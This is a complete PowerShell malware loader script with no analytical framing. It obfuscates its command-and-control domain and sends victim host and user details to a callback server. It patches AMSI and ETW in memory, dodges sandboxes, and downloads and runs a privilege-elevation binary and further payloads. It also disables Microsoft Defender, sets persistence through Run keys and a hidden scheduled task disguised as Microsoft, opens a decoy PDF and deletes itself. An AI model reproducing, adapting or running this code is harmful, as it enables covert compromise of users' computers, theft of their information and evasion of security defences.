$ProgressPreference='SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12

# === MULTI-SOURCE: GitHub (primary) + signindat.com (fallback) ===
$c1='ht';$c2='tps';$c3='://s';$c4='igni';$c5='ndat';$c6='.com'
$srv=$c1+$c2+$c3+$c4+$c5+$c6
$gh='https://raw.githubusercontent.com/icek888/XenoR2/main/payloads'
$sources=@(
    "$gh",
    "$srv"
)

$logPath="$env:TEMP\wmisrv.log"
function _log($m){
    $ts=Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    "$ts | $m" | Out-File $logPath -Append -Encoding utf8
}

# === TELEMETRY CALLBACK ===
$cbHost=$env:COMPUTERNAME
$cbUser=$env:USERNAME
$cbPid=$pid
try {
    $cbIp=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' -and $_.PrefixOrigin -ne 'WellKnown' } | Select-Object -First 1).IPAddress
} catch { $cbIp='unknown' }
try {
    $cbOs=(Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption
} catch { $cbOs='unknown' }

function _cb($stage,$status,$detail){
    try {
        $body=@{
            hostname=$cbHost
            username=$cbUser
            ip=$cbIp
            os=$cbOs
            is_admin=$cbIsAdmin
            pid=$cbPid
            stage=$stage
            status=$status
            detail=$detail
            ts=(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')
        } | ConvertTo-Json -Compress
        $wc=New-Object Net.WebClient
        $wc.Headers.Add('Content-Type','application/json')
        $wc.UploadString("$srv/cb.php",'POST',$body) | Out-Null
    } catch {}
}

_log "S0: pid=$pid, u=$env:USERNAME, h=$cbHost, ip=$cbIp"
_cb 'S0' 'ok' "pid=$pid, u=$env:USERNAME, h=$cbHost, ip=$cbIp, os=$cbOs"

$k='ker';$kb='nel32.dll'
$Dm=[AppDomain]::CurrentDomain
$Da=New-Object System.Reflection.AssemblyName('W')
$Ab=$Dm.DefineDynamicAssembly($Da,[System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$Mb=$Ab.DefineDynamicModule('M',$false)
$Tb=$Mb.DefineType('W','Public,Class')
$Dll=[System.Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
$Fld=[System.Reflection.FieldInfo[]]@([System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'))
$Val=[Object[]]@($True)
$ka=@($k+$kb)
$m0=$Tb.DefineMethod('LL','Public,Static',[IntPtr],@([String]))
$m0.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
$m1=$Tb.DefineMethod('GA','Public,Static',[IntPtr],@([IntPtr],[String]))
$m1.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
$m2=$Tb.DefineMethod('VA','Public,Static',[IntPtr],@([IntPtr],[UInt32],[UInt32],[UInt32]))
$m2.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
$m3=$Tb.DefineMethod('VP','Public,Static',[bool],@([IntPtr],[UIntPtr],[UInt32],[UInt32].MakeByRefType))
$m3.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
$m4=$Tb.DefineMethod('VF','Public,Static',[bool],@([IntPtr],[UInt32],[UInt32]))
$m4.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
$m5=$Tb.DefineMethod('CT','Public,Static',[IntPtr],@([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],[UInt32].MakeByRefType))
$m5.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
$m6=$Tb.DefineMethod('WF','Public,Static',[UInt32],@([IntPtr],[UInt32]))
$m6.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
$W=$Tb.CreateType()
_log "S0: rt ready"
_cb 'S0' 'ok' 'runtime ready'

function _p0 {
    try {
        $nd='ntd';$ndb='ll.dll'
        $nt=$W::LL($nd+$ndb)
        if ($nt -eq [IntPtr]::Zero) { _log "S0: ld fail"; _cb 'S0' 'fail' 'ntdll load failed'; return $false }
        [byte[]]$p6=@(0xB8,0x00,0x00,0x00,0x00,0xC3)
        $ew=$W::GA($nt,[char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101)
        if ($ew -ne [IntPtr]::Zero) {
            $o=[UInt32]0;$W::VP($ew,[UIntPtr]::new(6),0x40,[ref]$o)|Out-Null
            [Runtime.InteropServices.Marshal]::Copy($p6,0,$ew,6)
            $W::VP($ew,[UIntPtr]::new(6),$o,[ref]$o)|Out-Null
        }
        $ewt=$W::GA($nt,[char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101+[char]84+[char]114+[char]97+[char]110+[char]115+[char]102+[char]101+[char]114)
        if ($ewt -ne [IntPtr]::Zero) {
            $o=[UInt32]0;$W::VP($ewt,[UIntPtr]::new(6),0x40,[ref]$o)|Out-Null
            [Runtime.InteropServices.Marshal]::Copy($p6,0,$ewt,6)
            $W::VP($ewt,[UIntPtr]::new(6),$o,[ref]$o)|Out-Null
        }
        _log "S0: p0 ok"
        _cb 'S0' 'ok' 'ETW patched'
        return $true
    } catch { _log "S0: p0 err"; _cb 'S0' 'fail' 'ETW patch error'; return $false }
}

function _p1 {
    try {
        $ad='ams';$adb='i.dll'
        $am=$W::LL($ad+$adb)
        if ($am -eq [IntPtr]::Zero) { _log "S0: ld fail"; _cb 'S0' 'fail' 'amsi.dll load failed'; return $false }
        $sb=$W::GA($am,[char]65+[char]109+[char]115+[char]105+[char]83+[char]99+[char]97+[char]110+[char]66+[char]117+[char]102+[char]102+[char]101+[char]114)
        if ($sb -eq [IntPtr]::Zero) { _cb 'S0' 'warn' 'AmsiScanBuffer not found'; return $false }
        [byte[]]$p6=@(0xB8,0x00,0x00,0x00,0x00,0xC3)
        $o=[UInt32]0;$W::VP($sb,[UIntPtr]::new(6),0x40,[ref]$o)|Out-Null
        [Runtime.InteropServices.Marshal]::Copy($p6,0,$sb,6)
        $W::VP($sb,[UIntPtr]::new(6),$o,[ref]$o)|Out-Null
        _log "S0: p1 ok"
        _cb 'S0' 'ok' 'AMSI patched'
        return $true
    } catch { _log "S0: p1 err"; _cb 'S0' 'fail' 'AMSI patch error'; return $false }
}

function _chk {
    if ($env:USERDOMAIN -eq 'WORKGROUP') { _log "S0: chk fail (workgroup)"; _cb 'S0' 'fail' 'sandbox: workgroup'; return $false }
    try {
        $os=Get-CimInstance Win32_OperatingSystem -ErrorAction Stop
        $ramMB=[math]::Round($os.TotalVisibleMemorySize/1024)
        if ($ramMB -lt 2048) { _log "S0: chk fail (ram=$ramMB)"; _cb 'S0' 'fail' "sandbox: ram=$ramMB MB"; return $false }
        $uptime=(Get-Date) - $os.LastBootUpTime
        if ($uptime.TotalMinutes -lt 30) { _log "S0: chk fail (uptime=$($uptime.TotalMinutes)m)"; _cb 'S0' 'fail' "sandbox: uptime=$([math]::Round($uptime.TotalMinutes))m"; return $false }
    } catch { _log "S0: chk fail"; _cb 'S0' 'fail' 'sandbox: OS query failed'; return $false }
    try {
        $cpu=Get-CimInstance Win32_Processor -ErrorAction Stop
        if ($cpu.NumberOfLogicalProcessors -lt 2) { _log "S0: chk fail (cpu=$($cpu.NumberOfLogicalProcessors))"; _cb 'S0' 'fail' "sandbox: cpu=$($cpu.NumberOfLogicalProcessors)"; return $false }
    } catch {}
    _log "S0: chk ok"
    _cb 'S0' 'ok' 'sandbox checks passed'
    return $true
}

function _dl($remoteName,$localPath) {
    foreach ($src in $sources) {
        $u="$src/$remoteName"
        try {
            $wc=New-Object Net.WebClient
            $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            $d=$wc.DownloadData($u)
            _log "DL: $remoteName $($d.Length)b from $src"
            if ($localPath) { [IO.File]::WriteAllBytes($localPath,$d) }
            return ,$d
        } catch {
            if ($localPath) {
                try {
                    $p=Start-Process bitsadmin -ArgumentList "/transfer dl$([guid]::NewGuid().ToString('N').Substring(0,8)) /download /priority high $u $localPath" -Wait -NoNewWindow -PassThru
                    if ($p.ExitCode -eq 0 -and (Test-Path $localPath)) {
                        _log "DL: $remoteName from $src (bitsadmin)"
                        return ,[IO.File]::ReadAllBytes($localPath)
                    }
                } catch {}
            }
        }
    }
    _log "DL: $remoteName FAILED from all sources"
    return $null
}

function _runExe($remoteName,$localName,$stage,$label) {
    $localPath="$env:TEMP\$localName"
    $bytes=_dl $remoteName $localPath
    if ($bytes -and (Test-Path $localPath)) {
        try {
            $p=Start-Process $localPath -WindowStyle Hidden -PassThru
            _log "$stage : pid=$($p.Id)"
            _cb $stage 'ok' "$label started, pid=$($p.Id)"
            Start-Sleep 3
            return $true
        } catch { _cb $stage 'fail' "$label start failed: $($_.Exception.Message)"; return $false }
    } else { _cb $stage 'fail' "$remoteName download failed"; return $false }
}

_p0
_p1
if (-not (_chk)) {
    Start-Sleep -Seconds 60
    return
}

$cbIsAdmin=$false
try { $cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) } catch {}
_log "S1: a=$cbIsAdmin"
_cb 'S1' 'ok' "is_admin=$cbIsAdmin"

if (-not $cbIsAdmin) {
    $escBytes=_dl 'ElevatorShellCode.exe' "$env:TEMP\wmisrv.exe"
    if ($escBytes -and (Test-Path "$env:TEMP\wmisrv.exe")) {
        try {
            $ep=Start-Process "$env:TEMP\wmisrv.exe" -WindowStyle Hidden -PassThru
            _log "S1: p=$($ep.Id)"
            Start-Sleep 5
            try { $cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) } catch {}
            _log "S1: a=$cbIsAdmin"
            if ($cbIsAdmin) {
                _cb 'S1' 'ok' 'elevation ok, now admin'
            } else {
                _cb 'S1' 'warn' 'elevation failed, still user'
            }
        } catch { _cb 'S1' 'warn' 'elevation crashed' }
    } else { _cb 'S1' 'warn' 'elevator download failed' }
}

try {
    $mp1='Add-';$mp2='MpPr';$mp3='efer';$mp4='ence'
    $mpCmd=$mp1+$mp2+$mp3+$mp4
    & $mpCmd -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
    & $mpCmd -ExclusionPath "$env:APPDATA" -ErrorAction SilentlyContinue
    & $mpCmd -ExclusionProcess "msupdate.exe" -ErrorAction SilentlyContinue
    & $mpCmd -ExclusionProcess "wmisrv.exe" -ErrorAction SilentlyContinue
    & $mpCmd -ExclusionProcess "taskhostw.exe" -ErrorAction SilentlyContinue
} catch {}

if ($cbIsAdmin) {
    try {
        $dp='Def';$dpa='ender'
        $defPath='HKLM:\SOFTWARE\Policies\Microsoft\Windows '+$dp+$dpa
        if (-not (Test-Path $defPath)) { New-Item -Path $defPath -Force | Out-Null }
        $dp1='Disable';$dp2='AntiSpyware'
        Set-ItemProperty -Path $defPath -Name ($dp1+$dp2) -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
        $rtpPath="$defPath\Real-Time Protection"
        if (-not (Test-Path $rtpPath)) { New-Item -Path $rtpPath -Force | Out-Null }
        $dr1='Disable';$dr2='RealtimeMonitoring'
        Set-ItemProperty -Path $rtpPath -Name ($dr1+$dr2) -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
    } catch {}

    $upBytes=_dl 'update.exe' "$env:TEMP\msupdate.exe"
    if ($upBytes -and (Test-Path "$env:TEMP\msupdate.exe")) {
        try {
            $up=Start-Process "$env:TEMP\msupdate.exe" -ArgumentList 'kill' -Wait -NoNewWindow -PassThru
            _log "S2: ok"
            _cb 'S2' 'ok' 'defender killed'
        } catch { _cb 'S2' 'warn' 'defender kill failed' }
    } else { _cb 'S2' 'warn' 'update.exe download failed' }
    Start-Sleep 2
} else {
    _cb 'S2' 'skip' 'not admin, defender kill skipped'
}

$persistCmd="cmd.exe /c bitsadmin /transfer ps1 /download /priority high $srv/stage_pulsar.ps1 %TEMP%\s.ps1 && powershell -w hidden -NoP -file %TEMP%\s.ps1"

try {
    $rk='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    $vn1='Windows';$vn2='Security';$vn3='Health';$vn4='Monitor'
    Set-ItemProperty -Path $rk -Name ($vn1+$vn2+$vn3+$vn4) -Value $persistCmd -Force -ErrorAction SilentlyContinue
} catch {}

if ($cbIsAdmin) {
    try {
        $rk='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
        $vn1='Windows';$vn2='Update';$vn3='Orchestrator';$vn4='Service'
        Set-ItemProperty -Path $rk -Name ($vn1+$vn2+$vn3+$vn4) -Value $persistCmd -Force -ErrorAction SilentlyContinue
    } catch {}
}

$taskName='WindowsHealthMonitor'
try {
    schtasks /delete /tn $taskName /f 2>$null | Out-Null
    $xml=@"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Author>Microsoft</Author><Description>Windows Health Monitor Service</Description></RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <BootTrigger><Enabled>true</Enabled></BootTrigger>
    <CalendarTrigger><StartBoundary>2024-01-01T00:00:00</StartBoundary><Repetition><Interval>PT4H</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition><Enabled>true</Enabled></CalendarTrigger>
  </Triggers>
  <Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority></Settings>
  <Actions Context="Author">
    <Exec><Command>powershell.exe</Command><Arguments>-w hidden -NoP -c "$s='$srv';[IO.File]::WriteAllBytes(\"$env:TEMP\s.ps1\",(New-Object Net.WebClient).DownloadData(\"$s/stage_pulsar.ps1\"));powershell -w hidden -NoP -file $env:TEMP\s.ps1"</Arguments></Exec>
  </Actions>
</Task>
"@
    $xmlPath="$env:TEMP\task.xml"
    [IO.File]::WriteAllText($xmlPath,$xml,[Text.Encoding]::Unicode)
    schtasks /create /tn $taskName /xml $xmlPath /f 2>&1 | Out-Null
    Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
} catch {
    try {
        schtasks /create /tn $taskName /tr "powershell.exe -w hidden -NoP -c `"`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(`"`$env:TEMP\s.ps1`",`$w.DownloadData('$srv/stage_pulsar.ps1'));powershell -w hidden -NoP -file `$env:TEMP\s.ps1`"" /sc daily /st 00:00 /ri 240 /rl highest /f 2>&1 | Out-Null
    } catch {}
}

_cb 'S3' 'ok' 'persistence set (reg+task)'

# === S5: Download + Execute PatchPulsaar.exe ===
_runExe 'PatchPulsaar.exe' 'taskhostw.exe' 'S5' 'PatchPulsaar.exe'

# === S7: Decoy PDF ===
$pdf1='Rate';$pdf2='_Confirmation';$pdf3='_LD-2026-0847';$pdf4='.pdf'
$pdfName=$pdf1+$pdf2+$pdf3+$pdf4
$pdfPath="$env:USERPROFILE\Downloads\$pdfName"
$pdfBytes=_dl $pdfName $pdfPath
if ($pdfBytes -and (Test-Path $pdfPath)) {
    try { Start-Process $pdfPath; _cb 'S7' 'ok' 'decoy PDF opened' } catch { _cb 'S7' 'warn' 'decoy PDF open failed' }
} else { _cb 'S7' 'warn' 'decoy PDF download failed' }

Start-Sleep 5
Remove-Item "$env:TEMP\wmisrv.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\msupdate.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\taskhostw.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\s.ps1" -Force -ErrorAction SilentlyContinue

$sp=$MyInvocation.MyCommand.Path
if ($sp -and (Test-Path $sp)) {
    Start-Process powershell.exe -ArgumentList "-NoP -w hidden -c `"Start-Sleep 3;Remove-Item -Path '$sp' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
}

_log "S9: done"
_cb 'S9' 'ok' 'stage complete'
